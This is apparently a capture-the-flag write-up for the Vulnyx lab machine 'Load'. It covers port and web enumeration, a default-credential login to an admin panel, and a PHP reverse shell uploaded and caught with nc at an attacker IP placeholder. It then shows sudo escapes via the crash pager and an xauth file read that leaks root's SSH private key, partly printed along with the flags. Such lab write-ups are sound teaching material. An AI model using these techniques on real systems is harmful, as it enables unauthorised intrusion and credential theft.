# Vulnyx: Load

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `curl` · `nc` |
| **Tags** | `#DefaultCredentials` `#FileUpload` `#RCE` `#SudoAbuse` `#crash` `#xauth` `#GTFOBins` `#InfoDisclosure` |
| **URL** | https://vulnyx.com/machines/ |

An admin panel found through `robots.txt` still uses its default `admin:admin` credentials, and its file upload drops a PHP reverse shell into the web root. A `sudo` rule around `crash` — a Linux kernel-dump analysis tool — pivots to a second user by escaping through the pager that displays its help. From there, the same `xauth` file-read trick used on another box in this set leaks root's private key, extracted this time by pulling out everything inside quotes in `xauth`'s noisy error output.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn load.nyx

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:2C:46:3C (Oracle VirtualBox virtual NIC)
```

Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details — note the `robots.txt` entry the scan already flags:

```bash
$ sudo nmap -p 22,80 -sCV load.nyx

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
|_ssh-hostkey:
|   256 a9:d8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:38:e4:44:0c:b9:0a:e0:e7:31:30:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-robots.txt: 1 disallowed entry
|_/iteddev
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:2C:46:3C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Enumeration

```
http://load.nyx
```

<img src="../Images/load/Pasted image 20260830154929.png"/>

A content scan of the root finds only the default page and `robots.txt`:

```bash
$ ffuf -u http://load.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.html                 [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 231ms]
.css                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 596ms]
robots.txt                 [Status: 200, Size: 34, Lines: 3, Duration: 2ms]
server-status              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 175ms]
```

`robots.txt` points at a hidden directory — the `ritedev/` application:

```
http://load.nyx/robots.txt
```

<img src="../Images/load/Pasted image 20260830155002.png"/>

> ⚠️ **Path note:** nmap parsed the disallowed entry as `/iteddev`, but the directory that actually exists and answers is `/ritedev` (its `ffuf` scan below returns real content). `ritedev` is used throughout here; confirm the exact spelling in `robots.txt` on the box if a request 404s.

```
http://load.nyx/ritedev
```

<img src="../Images/load/Pasted image 20260830155017.png"/>

Enumerating inside `ritedev/` reveals the application's structure and, crucially, an `admin.php` login:

```bash
$ ffuf -u http://load.nyx/ritedev/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

media                      [Status: 301, Size: 312, Words: 20, Duration: 13ms]
templates                  [Status: 301, Size: 316, Words: 20, Duration: 13ms]
files                      [Status: 301, Size: 312, Words: 20, Duration: 0ms]
data                       [Status: 301, Size: 311, Words: 20, Duration: 2ms]
admin.php                  [Status: 200, Size: 1078, Words: 56, Lines: 37, Duration: 118ms]
cms                        [Status: 301, Size: 310, Words: 20, Duration: 2ms]
```

> **Default credentials:** `admin:admin`

## Initial Access

### RiteDev Admin Panel

The `admin.php` login accepts the CMS's out-of-the-box `admin:admin` — the first thing worth trying against any custom panel before assuming a real vulnerability is needed:

```
http://load.nyx/ritedev/admin.php
```

<img src="../Images/load/Pasted image 20260830155037.png"/>
<img src="../Images/load/Pasted image 20260830155123.png"/>
<img src="../Images/load/Pasted image 20260830155147.png"/>
<img src="../Images/load/Pasted image 20260830155221.png"/>
<img src="../Images/load/Pasted image 20260830155249.png"/>

The panel exposes a file manager / upload that writes into `media/`, a directory served directly under the web root. A PentestMonkey PHP reverse shell is uploaded there — because `media/` executes PHP, requesting the file runs it:

> **Reverse Shell:** PHP PentestMonkey

### Shell as www-data

Triggering the uploaded shell fires the callback:

```bash
$ curl http://load.nyx/ritedev/media/rev_shell.php
```

A listener catches it:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [load.nyx] 33696
Linux load 6.1.0-16-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.67-1 (2023-12-12) x86_64 GNU/Linux
15:45:52 up 32 min, 0 users, load average: 0.00, 0.55, 3.80

USER     TTY      FROM             LOGIN@  IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (538): Inappropriate ioctl for device
bash: no job control in this shell
www-data@load:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is stabilized with `script`, the same approach used elsewhere in this set as an alternative to Python's `pty.spawn`:

```bash
script /dev/null -c bash
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

### Escalating to travis via `crash`

```bash
www-data@load:/$ sudo -l
Matching Defaults entries for www-data on load:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/sbin:/usr/bin,
    use_pty

User www-data may run the following commands on load:
    (travis) NOPASSWD: /usr/bin/crash
```

> **GTFOBins:** `https://gtfobins.github.io/gtfobins/crash/`

`crash` — a tool for analyzing Linux kernel crash dumps — is runnable as `travis`. The escape isn't in `crash` itself but in how it prints long output: `crash -h` pages its help through the system pager (`less`/`more`), and any pager lets you run a shell with `!`. Because `crash` was launched with `sudo -u travis`, the pager — and the shell spawned from it — inherit that identity. The "terminal is not fully functional / Press RETURN to continue" line is the pager starting up:

```bash
www-data@load:/$ sudo -u travis /usr/bin/crash -h
WARNING: terminal is not fully functional
Press RETURN to continue
USAGE:

    crash [OPTION]... NAMELIST MEMORY-IMAGE[ADDRESS] (dumpfile form)
    crash [OPTION]... [NAMELIST]                    (live system form)

OPTIONS:

    NAMELIST
        This is a pathname to an uncompressed kernel image (a vmlinux
        file), or a Xen hypervisor image (a xen-syms file) which has
        been compiled with the "-g" option. If using the dumpfile form,
        the vmlinux file may be compressed in either gzip or bzip2 formats.
...
```

At the pager prompt, `!` followed by a command runs it as `travis`:

```
!/bin/bash
```

```bash
travis@load:/$ id
uid=1000(travis) gid=1000(travis) groups=1000(travis)
travis@load:/$ ls -l /home/travis/
total 4
-r--------  1 travis travis 33 Jan  1  2024 user.txt
travis@load:/$ cat /home/travis/user.txt
c08d9e59eb1252c60bf2ec2fd73c87f1
```

> **User flag:** `c08d9e59eb1252c60bf2ec2fd73c87f1`

## Privilege Escalation

### `xauth` File Read, Again

```bash
travis@load:/$ sudo -l
Matching Defaults entries for travis on load:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/sbin:/usr/bin,
    use_pty

User travis may run the following commands on load:
    (root) NOPASSWD: /usr/bin/xauth
```

`xauth` manages X11 authorization cookies, and its `source` command reads a file expecting each line to be an `xauth` sub-command. Point it at a file that *isn't* a list of commands and it complains — echoing the offending line back inside an `unknown command "..."` error. Run as root via `sudo`, that turns `xauth` into an arbitrary file-reader: it reads root-only files like `/root/.ssh/id_rsa` (mode `0600`, owned by root) and prints their contents through the error channel, sidestepping the permissions that keep `travis` out:

```bash
travis@load:/$ sudo /usr/bin/xauth source /root/.ssh/id_rsa
/usr/bin/xauth: file /root/.Xauthority does not exist
/usr/bin/xauth: /root/.ssh/id_rsa:1: unknown command "-----BEGIN"
/usr/bin/xauth: /root/.ssh/id_rsa:2: unknown command "MIIEpAIBAAKCAQEAn1xk2mDDDXCTen7d97aY7cEVweRUsVE5ZL4cGPQ/yXLAAwdz"
/usr/bin/xauth: /root/.ssh/id_rsa:3: unknown command "5GiauqvTRhGGomhxi3aLqzEoSfQyDlRqU8bUW0J6vvlA8Ws1QcI28RFc"
/usr/bin/xauth: /root/.ssh/id_rsa:4: unknown command "CvlDVKIdFOweMAIXsKvUEY3rW3qhq37fFdT/DBL7BCgXr170/D91t4FBPoCN5Fsy"
...
```

Each base64 line of the key comes back wrapped in double quotes in the error output. So instead of hand-stripping the `unknown command` noise line by line, everything inside quotes is pulled out at once:

```bash
$ grep -oP '".*?"' id_rsa | tr -d '"' | tee root_rsa
```

The quote-based extraction misses the header and footer lines (`-----BEGIN` isn't quoted the same way), so those are added back manually to make the key valid:

> **Add:** `-----BEGIN RSA PRIVATE KEY-----` / `-----END RSA PRIVATE KEY-----`

<img src="../Images/load/Pasted image 20260830160336.png"/>

The recovered key logs straight in as root:

```bash
$ ssh root@load.nyx -i root_rsa
root@load:~# id
uid=0(root) gid=0(root) groups=0(root)
root@load:~# ls -la /root
total 28
drwx------  4 root root 4096 ago 29 15:50 .
drwxr-xr-x 18 root root 4096 ene  1  2024 ..
-rw-r--r--  1 root root    9 nov 15  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root  161 jul  9  2019 .bashrc
drwxr-xr-x  3 root root 4096 nov 15  2023 .local
-rw-r--r--  1 root root  161 jul  9  2019 .profile
-r--------  1 root root   33 ene  1  2024 .rooooooooooooooooooooooooooooooooot.txt
drwx------  2 root root 4096 ene  1  2024 .ssh
root@load:~# cat /root/.rooooooooooooooooooooooooooooooooot.txt
85ed930643d8302cbbdcbc7c5491b3
```
> **Root flag:** `85ed930643d8302cbbdcbc7c5491b3`

## Takeaways

- Default credentials remain one of the most reliable ways into any custom admin panel — worth trying immediately once one is found, before assuming anything more complex is needed.
- A `sudo` rule around a tool that pages its output is a shell in disguise — `crash -h` never runs a shell itself, but the `less`/`more` pager it invokes does, and `!command` in that pager runs with whatever identity `sudo` gave the tool.
- `xauth source <file>` run as root is a clean arbitrary-file-read primitive: unreadable files are disclosed through its `unknown command` errors, no separate vulnerability required.
- Extracting structured data from a noisy leak channel doesn't have to mean stripping known noise line by line — pulling out quoted substrings worked just as well here, with the trade-off of manually restoring the header and footer that weren't quoted.
- The `xauth` file-read technique is worth remembering as a general pattern, not a one-off — it showed up on two separate boxes in this set with two different extraction approaches.